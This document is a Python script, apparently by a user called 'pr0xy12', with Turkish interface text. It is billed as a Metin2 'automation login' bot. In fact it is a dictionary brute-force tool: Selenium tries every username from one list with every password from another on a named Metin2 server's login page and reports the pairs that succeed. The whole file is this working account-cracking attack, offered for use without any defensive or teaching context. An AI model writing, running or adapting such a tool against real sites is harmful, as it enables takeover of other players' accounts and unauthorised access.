#!usr/bin/env python3
#-*- coding:utf-8 -*-
# https://www.github.com/pr0xy12

from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.support import expected_conditions as EC
from requests import status_codes
from bs4 import BeautifulSoup
from sys import exit
from datetime import datetime
from platform import python_version
from time import sleep
from os import name
from os import system
from colorama import Fore, Back, Style
import colorama
import platform

class AppData(object):
    def Appİnformation(self):
        self._OS_ = "Linux and Windows"
        self._VERSION_ = "V1.0.0"
        self._APPNAME_ = "Metin2_AutomationLogin"
        self._DEV_ = "pr0xy12"

class pColor:
    WARNING = '\033[91m'
    DEFAULT = '\033[0m'
    WHITE = '\033[46m'

class Module_Control(object):
    @staticmethod
    def CONTROL():
        if int(python_version()[0]) < 3:
            print("{0}[!]{1}{2} Python Version 3 Kullanınız.".format(pColor.WARNING, pColor.DEFAULT, pColor.WHITE))
            exit()

        try:
            import selenium
            from selenium import webdriver
            return True

        except ModuleNotFoundError:
            print("{0}[!]{1} Selenium Modülünüz Yüklü Değildir..".format(pColor.WARNING, pColor.DEFAULT))
            exit()
        
        try:
            import colorama
            from colorama import Fore, Back, Style
            return True

        except ModuleNotFoundError:
            print("{0}[!]{1} Colorama Modülünüz Yüklü Değildir..".format(pColor.WARNING, pColor.DEFAULT))
            exit()
        try:
            import requests
            from bs4 import BeautifulSoup
            return True

        except ModuleNotFoundError:
            print("{0}[!]{1} Requests ve BeautifulSoup Modülünüz Yüklü Değildir..".format(pColor.WARNING, pColor.DEFAULT))
            exit()
            

class Metin2_AutomationLogin(object):
    def __init__(self, loginlist, passlist, webdriverpath, site):
        colorama.init()
        self.loginlist = loginlist
        self.passlist = passlist
        self.webdriverpath = webdriverpath
        self.site = site

    def Time(self, hours, minutes):
        self.hours = hours
        self.minutes = minutes
    
    def LoginPassKontrol(self):
       try:
            self.loginLC = open(self.loginlist, "r").readlines()
            self.passLC = open(self.passlist, "r").readlines()
       except (FileNotFoundError, ValueError):
            print("{0}[!]{1} {2}'Loginlist.txt' ve 'PassList.txt'{3} Dosyası Bulunamadı.".format(Fore.RED, Fore.RESET, Style.BRIGHT, Style.NORMAL))
       self.lcounter = 0
       self.pcounter = 0
       print("\n")
       try:
            for item in self.loginLC:
                print("Kullanıcı Adı : {}".format(item), end="")
                self.lcounter += 1
            print("\n")
            for item2 in self.passLC:
                print("Şifre : {}".format(item2), end="")
                self.pcounter += 1
            print("\n")
            print("Toplam'da | {0}Kullanıcı Adı : {1}{2}{3} | {0}Şifre Sayısı : {1}{4}{3}".format(Style.BRIGHT, Fore.RED, str(self.lcounter), Fore.RESET, str(self.pcounter)))
       except AttributeError:
            print("{0}[!]{1} {2}'Loginlist.txt' ve 'PassList.txt'{3} Dosyasına Erişilemedi".format(Fore.RED, Fore.RESET, Style.BRIGHT, Style.NORMAL))
    def AppMenu(self):
        print(r"{0}|  \/  ||  ___|_   _|_   _| \ | |/ __  \ {0}{1}{2}| ___ \|  _  |_   _|{1}".format(Fore.RED, Fore.RESET, Fore.GREEN))
        print(r"{0}| .  . || |__   | |   | | |  \| |`' / /' {0}{1}{2}| |_/ /| | | | | |{1}".format(Fore.RED, Fore.RESET, Fore.GREEN))  
        print(r"{0}| |\/| ||  __|  | |   | | | . ` |  / /   {0}{1}{2}| ___ \| | | | | |{1}".format(Fore.RED, Fore.RESET, Fore.GREEN))  
        print(r"{0}| |  | || |___  | |  _| |_| |\  |./ /___ {0}{1}{2}| |_/ /\ \_/ / | |{1}".format(Fore.RED, Fore.RESET, Fore.GREEN))  
        print(r"{0}\_|  |_/\____/  \_/  \___/\_| \_/\_____/ {0}{1}{2}\____/  \___/  \_/{1}".format(Fore.RED, Fore.RESET, Fore.GREEN))
        print("\n{0}    Developer: {1}{2}{3}pr0xy12{1}\n".format(Fore.GREEN, Fore.RESET, Style.BRIGHT, Fore.RED))
        print("{0}[1]{1} {2}Botu Başlat".format(Fore.GREEN, Fore.RESET, Style.BRIGHT))
        print("{0}[2]{1} {2}Login ve Pass List Kontrolü".format(Fore.GREEN, Fore.RESET, Style.BRIGHT))
        print("{0}[3]{1} {2}Exit".format(Fore.GREEN, Fore.RESET, Style.BRIGHT))
    
    def main(self):
        self.driver = webdriver.Firefox(executable_path=self.webdriverpath)
        self.driver.get(self.site)
        self.soup = BeautifulSoup(self.driver.page_source, "lxml")
        self.control = self.soup.find_all("div", attrs={"class":"navigation-block "})
        try:
            self.loginL = open(self.loginlist, "r").readlines()
            self.passL = open(self.passlist, "r").readlines()
        except FileNotFoundError:
            print("{0}[!]{1} {2}'Loginlist.txt' ve 'PassList.txt'{3} Dosyası Bulunamadı.".format(Fore.RED, Fore.RESET, Style.BRIGHT, Style.NORMAL))
        for login in self.loginL:
            for passwd in self.passL:
                try:
                    print("{0}   [404]{1}".format(Fore.RED, Fore.RESET))
                    print("Kullanıcı Adı : {0}{1}{2}{3}".format(Fore.RED, Style.BRIGHT, login, Fore.RESET), end="")
                    print("Şifre : {0}{1}{2}{3}".format(Fore.RED, Style.BRIGHT, passwd, Fore.RESET), end="")
                    print("\n")
                    self.findusername = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.NAME, "Username")))
                    sleep(1)
                    self.findusername.send_keys(login)
                    self.findpassword = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.NAME, "Password")))
                    sleep(1)
                    self.findpassword.send_keys(passwd)
                    sleep(1.5)
                    self.findpassword.send_keys(Keys.ENTER)
                except:
                    print("{0}[!]{1} {2}Sayfa Kaynağına{3} Ulaşılamadı..".format(Fore.RED, Fore.RESET, Style.BRIGHT, Style.NORMAL))
                sleep(5)
                try:
                    self.findusername = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.NAME, "Username")))
                    self.findusername.send_keys(Keys.CONTROL, "a")
                    sleep(0.5)
                    self.findusername.send_keys(Keys.BACKSPACE)
                    sleep(0.5)
                    self.findpassword.send_keys(Keys.CONTROL, "a")
                    sleep(0.5)
                    self.findpassword.send_keys(Keys.BACKSPACE)
                    print("{0}   [404]{1}".format(Fore.RED, Fore.RESET))
                    print("Kullanıcı Adı : {0}{1}{2}{3}".format(Fore.RED, Style.BRIGHT, login, Fore.RESET), end="")
                    print("Şifre : {0}{1}{2}{3}".format(Fore.RED, Style.BRIGHT, passwd, Fore.RESET), end="")
                    print("\n")
                except:
                    print(r"{0}[200]{1} Kullanıcı Adı : {2}{3}{4}{1} | Şifre : {2}{3}{5}{1}".format(Fore.GREEN, Fore.RESET, Fore.RED, Style.BRIGHT, str(login), str(passwd)))
                    self.driver.quit()
                    self.driver.get(self.site)
                    sleep(5)
        print("{0}[?]{1} Tüm İşlemler Bitti.".format(Fore.YELLOW, Fore.RESET))

if __name__ == "__main__":
    loginlist = "loginlist.txt"
    passlist = "passlist.txt"
    webdriverpath = "geckodriver"
    site = "https://www.saltanatmt2.com.tr/"
    hours = datetime.now().strftime("%H")
    minutes = datetime.now().strftime("%M")
    if platform.system == "Windows" or platform.system == "windows":
        system("cls")
    else:
        system("clear")
    Module_Control.CONTROL()
    start = Metin2_AutomationLogin(loginlist, passlist, webdriverpath, site)
    start.AppMenu()
    choice = input("{0}Seçiminiz: ".format(Style.BRIGHT))
    if choice.isdigit():
        choice = int(choice)
        if choice == 1:
            start.main()
        elif choice == 2:
            start.LoginPassKontrol()
        elif choice == 3:
            pass
        else:
            print("{0}[!]{1}{2} Lütfen 1, 2 veya 3 tuşlayınız..".format(Fore.RED, Fore.RESET, Style.BRIGHT))
    else:
        print("{0}[!]{1}{2} Lütfen numara tuşlayınız..".format(Fore.RED, Fore.RESET, Style.BRIGHT))